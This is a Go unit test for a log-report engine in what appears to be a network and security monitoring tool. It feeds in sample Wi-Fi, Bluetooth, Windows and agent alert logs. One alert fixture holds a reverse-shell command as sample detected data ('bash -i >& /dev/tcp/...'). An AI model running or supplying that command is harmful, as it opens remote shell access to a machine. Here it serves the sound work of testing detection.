package logreport

import (
	"context"
	"encoding/json"
	"strings"
	"testing"
	"time"
)

func TestEngine_ProcessSyslog(t *testing.T) {
	store := newStore(t)

	engine := NewEngine(store,
		WithFlushInterval(50*time.Millisecond),
		WithCleanInterval(10*time.Minute),
	)

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	if err := engine.Start(ctx); err != nil {
		t.Fatalf("engine.Start failed: %v", err)
	}

	// Ingest sample Wi-Fi, BlueScan, Pcap, WinLog syslogs
	now := time.Now()
	// 1. Standard tag
	engine.ProcessSyslog(map[string]interface{}{
		"tag":       "twWifiScan",
		"hostname":  "ap-scanner",
		"content":   "type=APInfo,ssid=TestSSID1,bssid=00:11:22:33:44:55,rssi=-50,Channel=1,info=wpa2",
		"timestamp": now,
	})

	// 2. Tag with trailing colon and PID: "twWifiScan[123]:"
	engine.ProcessSyslog(map[string]interface{}{
		"tag":       "twWifiScan[123]:",
		"hostname":  "ap-scanner",
		"content":   "type=APInfo,ssid=TestSSID2,bssid=00:11:22:33:44:56,rssi=-60,Channel=6,info=wpa3",
		"timestamp": now,
	})

	// 3. Tag empty, but content has prefix "twWifiScan: type=APInfo..."
	engine.ProcessSyslog(map[string]interface{}{
		"tag":       "",
		"client":    "192.168.1.50:514",
		"content":   "twWifiScan: type=APInfo,ssid=TestSSID3,bssid=00:11:22:33:44:57,rssi=-70,Channel=11,info=wpa2",
		"timestamp": now,
	})

	// 4. BlueScan
	engine.ProcessSyslog(map[string]interface{}{
		"tag":       "twBlueScan",
		"hostname":  "blue-scanner",
		"content":   "type=Device,address=aa:bb:cc:dd:ee:ff,name=BLEBeacon,rssi=-65",
		"timestamp": now,
	})

	// 5. Pcap
	engine.ProcessSyslog(map[string]interface{}{
		"tag":       "twpcap",
		"hostname":  "pcap-probe",
		"content":   "type=EtherType,0x0800=100",
		"timestamp": now,
	})

	// 6. WinLog
	engine.ProcessSyslog(map[string]interface{}{
		"tag":       "twwinlog",
		"hostname":  "DC01",
		"content":   "type=EventID,computer=DC01,eventID=4624,count=5",
		"timestamp": now,
	})

	// Flush and wait
	engine.Flush()

	// Verify datastore contains report entities
	wifiData, err := store.ListLogReportData(ctx, KindWifiAP)
	if err != nil {
		t.Fatalf("ListLogReportData failed: %v", err)
	}
	if len(wifiData) != 3 {
		t.Errorf("expected 3 wifiAP entities, got %d", len(wifiData))
	}

	blueData, err := store.ListLogReportData(ctx, KindBlueDevice)
	if err != nil {
		t.Fatalf("ListLogReportData failed: %v", err)
	}
	if len(blueData) != 1 {
		t.Errorf("expected 1 blueDevice entity, got %d", len(blueData))
	}

	pcapData, err := store.ListLogReportData(ctx, KindEtherType)
	if err != nil {
		t.Fatalf("ListLogReportData failed: %v", err)
	}
	if len(pcapData) != 1 {
		t.Errorf("expected 1 etherType entity, got %d", len(pcapData))
	}

	winData, err := store.ListLogReportData(ctx, KindWinEventID)
	if err != nil {
		t.Fatalf("ListLogReportData failed: %v", err)
	}
	if len(winData) != 1 {
		t.Errorf("expected 1 winEventID entity, got %d", len(winData))
	}

	// 7. twagentneo MQTT (metrics, alert, fim, sca, tcp)
	engine.ProcessMQTTMsg("agent-01", "10.0.0.55", "twsnmpneo/agent/agent-01/metrics", []byte(`{"agent_id":"agent-01","hostname":"agent-host-01","os":"linux","version":"v1.2.0","ip":"10.0.0.55","mac":"00:11:22:33:44:55","cpu_percent":35.5,"mem_percent":62.1,"disk_used_percent":48.0,"rx_mbps":10.2,"tx_mbps":3.4}`))
	engine.ProcessMQTTMsg("agent-01", "10.0.0.55", "twsnmpneo/agent/agent-01/alert", []byte(`{"timestamp":"2026-10-25T05:00:00Z","agent_id":"agent-01","hostname":"agent-host-01","level":"HIGH","category":"security","rule_title":"Reverse Shell","source_log":"bash -i >& /dev/tcp/198.51.100.10/4444","ai_judgment":{"is_threat":true,"confidence":0.96,"summary_ja":"リバースシェル検知","recommended_action_ja":"プロセス停止と隔離","compliance_violated":true,"compliance":["PCI-DSS","CIS"]}}`))
	engine.ProcessMQTTMsg("agent-01", "10.0.0.55", "twsnmpneo/agent/agent-01/fim", []byte(`{"timestamp":"2026-10-25T05:00:01Z","agent_id":"agent-01","hostname":"agent-host-01","level":"MEDIUM","category":"fim","rule_title":"FIM: WRITE /etc/passwd","source_log":"path=/etc/passwd op=WRITE hash=e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"}`))
	engine.ProcessMQTTMsg("agent-01", "10.0.0.55", "twsnmpneo/agent/agent-01/sca", []byte(`{"timestamp":"2026-10-25T05:00:02Z","agent_id":"agent-01","hostname":"agent-host-01","rule_id":"CIS-3.14","title":"World-Writable File","severity":"high","file_path":"/etc/cron.d/job","proof":"Permissions: 0666","remediation":"chmod 0644 /etc/cron.d/job","compliance":["CIS","CIS-3.14"],"ai_judge":{"is_threat":true,"confidence":0.9,"summary_ja":"危険なパーミッション","action_ja":"パーミッション修正"}}`))
	engine.ProcessMQTTMsg("agent-01", "10.0.0.55", "twsnmpneo/agent/agent-01/tcp", []byte(`[{"remote_ip":"8.8.8.8","process":"curl","services":["https"],"count":2}]`))

	// 8. twagentneo RFC 5424 Syslog
	engine.ProcessSyslog(map[string]interface{}{
		"app_name":        "twagentneo",
		"hostname":        "agent-host-01",
		"structured_data": `[twsnmpneo@17862 rule="Brute Force SSH" threat="YES" comp="NO"]`,
		"message":         "AI Summary: SSH brute force attempt",
		"severity":        3,
		"timestamp":       now,
	})
	engine.ProcessSyslog(map[string]interface{}{
		"app_name":        "twagentneo-sca",
		"hostname":        "agent-host-01",
		"structured_data": `[twsnmpneo@17862 rule="CIS-4.7: Leftover File" threat="NO" comp="YES"]`,
		"message":         "Configuration Audit: /tmp/test.bak",
		"severity":        4,
		"timestamp":       now,
	})

	// 9. twagentneo SNMP Trap
	engine.ProcessTrap(map[string]interface{}{
		"Time":        now.UnixNano(),
		"FromAddress": "10.0.0.55(agent-host-01)",
		"TrapType":    "twagentNeoSCAAlert",
		"Variables":   "twagentNeoHostname.0=agent-host-01, twagentNeoTrapSeverity.0=HIGH, twagentNeoTrapCategory.0=Configuration Audit, twagentNeoTrapRuleTitle.0=CIS-4.1: SSH Root Login Enabled, twagentNeoTrapSourceLog.0=/etc/ssh/sshd_config",
	})

	// 9. twagentneo SNMP Trap
	engine.ProcessTrap(map[string]interface{}{
		"Time":        now.UnixNano(),
		"FromAddress": "10.0.0.55(agent-host-01)",
		"TrapType":    "twagentNeoFIMTrap",
		"Variables":   "twagentNeoHostname.0=agent-host-01, twagentNeoTrapSeverity.0=HIGH, twagentNeoTrapCategory.0=fim, twagentNeoTrapRuleTitle.0=FIM: CHMOD /etc/shadow, twagentNeoTrapSourceLog.0=path=/etc/shadow op=CHMOD",
	})

	// 10. Multi-protocol merge test: Syslog for the same /etc/passwd file previously sent via MQTT
	engine.ProcessSyslog(map[string]interface{}{
		"app_name":        "twagentneo-fim",
		"hostname":        "agent-host-01",
		"structured_data": `[twsnmpneo@17862 op="WRITE" path="/etc/passwd"]`,
		"message":         "File WRITE: /etc/passwd",
		"severity":        4,
		"timestamp":       now,
	})

	engine.Flush()

	agentInfo, err := store.ListLogReportData(ctx, KindTwAgentInfo)
	if err != nil || len(agentInfo) == 0 {
		t.Fatalf("expected twAgentInfo entities, got %d (err: %v)", len(agentInfo), err)
	}
	agentAlerts, err := store.ListLogReportData(ctx, KindTwAgentAlert)
	if err != nil || len(agentAlerts) < 2 {
		t.Fatalf("expected >= 2 twAgentAlert entities, got %d (err: %v)", len(agentAlerts), err)
	}
	agentFIM, err := store.ListLogReportData(ctx, KindTwAgentFIM)
	if err != nil || len(agentFIM) < 2 {
		t.Fatalf("expected >= 2 twAgentFIM entities, got %d (err: %v)", len(agentFIM), err)
	}
	agentSCA, err := store.ListLogReportData(ctx, KindTwAgentSCA)
	if err != nil || len(agentSCA) < 3 {
		t.Fatalf("expected >= 3 twAgentSCA entities, got %d (err: %v)", len(agentSCA), err)
	}
	// Verify that /etc/passwd merged both "mqtt" and "syslog" protocols
	foundPasswdMerged := false
	for _, b := range agentFIM {
		var fimEnt TwAgentFIMEnt
		if err := json.Unmarshal(b, &fimEnt); err == nil && fimEnt.Path == "/etc/passwd" {
			if strings.Contains(strings.ToLower(fimEnt.Protocol), "mqtt") && strings.Contains(strings.ToLower(fimEnt.Protocol), "syslog") {
				foundPasswdMerged = true
			}
		}
	}
	if !foundPasswdMerged {
		t.Errorf("expected /etc/passwd to have merged both mqtt and syslog protocols")
	}
	agentTCP, err := store.ListLogReportData(ctx, KindTwAgentTCP)
	if err != nil || len(agentTCP) != 1 {
		t.Fatalf("expected 1 twAgentTCP entity, got %d (err: %v)", len(agentTCP), err)
	}

	engine.Stop()
}
